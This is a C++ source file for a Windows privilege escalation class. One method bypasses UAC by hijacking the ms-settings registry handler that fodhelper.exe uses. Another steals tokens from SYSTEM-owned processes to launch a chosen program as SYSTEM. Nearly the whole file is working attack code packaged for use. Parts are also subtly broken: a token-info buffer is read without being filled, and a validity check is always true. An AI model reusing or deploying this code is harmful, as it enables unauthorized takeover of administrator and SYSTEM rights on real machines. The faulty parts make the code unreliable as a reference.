#include <Tlhelp32.h>
#include <string>
#include <shellapi.h>


using namespace std;

class PrivilegeEscalationClass {
public:
    // Privilege Escalation Methods
    // 
    // @Author: S12
    // 
    // Run a process as admin from a user account
    bool runProcAsAdminFromUser(const wchar_t* cmdValue) {
        HKEY hkey;
        DWORD d;
        const wchar_t* settings = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
        const wchar_t* del = L"";
        bool success = false;

        // Attempt to open or create the registry key
        LSTATUS stat = RegCreateKeyExW(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
        if (stat != ERROR_SUCCESS) {
            wcout << L"Failed to open or create reg key\n";
            return success;
        }

        // Set the registry values (command and DelegateExecute)
        stat = RegSetValueExW(hkey, L"", 0, REG_SZ, reinterpret_cast<const BYTE*>(cmdValue), (wcslen(cmdValue) + 1) * sizeof(wchar_t));
        if (stat != ERROR_SUCCESS) {
            wcout << L"Failed to set reg value\n";
            return success;
        }

        // Set the DelegateExecute value to an empty string
        stat = RegSetValueExW(hkey, L"DelegateExecute", 0, REG_SZ, reinterpret_cast<const BYTE*>(del), (wcslen(del) + 1) * sizeof(wchar_t));
        if (stat != ERROR_SUCCESS) {
            wcout << L"Failed to set reg value: DelegateExecute\n";
            return success;
        }

        // Close the key handle
        RegCloseKey(hkey);

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;

        // Start the fodhelper.exe program with elevated privileges
        if (!ShellExecuteEx(&sei)) {
            DWORD err = GetLastError();
            wprintf(err == ERROR_CANCELLED ? L"The user refused to allow privilege elevation.\n" : L"Unexpected error! Error code: %ld\n", err);
        }
        else {
            wprintf(L"Successfully created process =^..^=\n");
        }
        success = true;
        return success;
    }

    // Run a process as system from an admin account
    bool runProcAsSystemFromAdmin(string procName) {
        bool success = false;
        string username;
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        string app;
        string userProcess;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        pe32.dwSize = sizeof(PROCESSENTRY32);
        cout << "Enter the path of the application you want to run as SYSTEM: ";
        cin >> app;
        wstring wapp = wstring(app.begin(), app.end());
        LPCWSTR LPCapp = wapp.c_str();

        while (Process32Next(hProcSnap, &pe32)) {
            pid = pe32.th32ProcessID;
            username = GetProcessUserName(pid);
            if (username == "" || username == "NT AUTHORITY/SYSTEM") {
                // get username of process
                HANDLE cToken = getToken(pid);
                if (cToken != NULL || cToken == 0) {
                    success = createProcess(cToken, LPCapp);
                    if (success) {
                        break;
                    }
                }
            }
        }
        CloseHandle(hProcSnap);
        return success;
    }


    HANDLE getToken(DWORD pid) {
        string userProcess;
        HANDLE cToken = NULL;
        HANDLE ph = NULL;
        ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
        if (ph == NULL) {
            cToken = (HANDLE)NULL;
        }
        else {
            BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
            if (!res) {
                cToken = (HANDLE)NULL;
            }
            else {
            }
        }
        if (ph != NULL) {
            CloseHandle(ph);
        }
        return cToken;
    }

    BOOL createProcess(HANDLE token, LPCWSTR app) {
        // initialize variables
        HANDLE dToken = NULL;
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        BOOL res = TRUE;
        ZeroMemory(&si, sizeof(STARTUPINFOW));
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        si.cb = sizeof(STARTUPINFOW);

        res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
        res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
        return res;
    }

    string GetProcessUserName(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProcess) return "";
        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return "";
        }
        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
        SID_NAME_USE SidType;
        wchar_t lpName[MAX_PATH];
        DWORD dwNameSize = MAX_PATH;
        wchar_t lpDomain[MAX_PATH];
        DWORD dwDomainSize = MAX_PATH;
        if (!LookupAccountSid(NULL, pTokenUser->User.Sid, lpName, &dwNameSize, lpDomain, &dwDomainSize, &SidType)) {
            free(pTokenUser);
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return "";
        }
        wstring username(lpDomain);
        username += L"/";
        username += lpName;
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return string(username.begin(), username.end());  // Convert wstring to string
    }

    
};
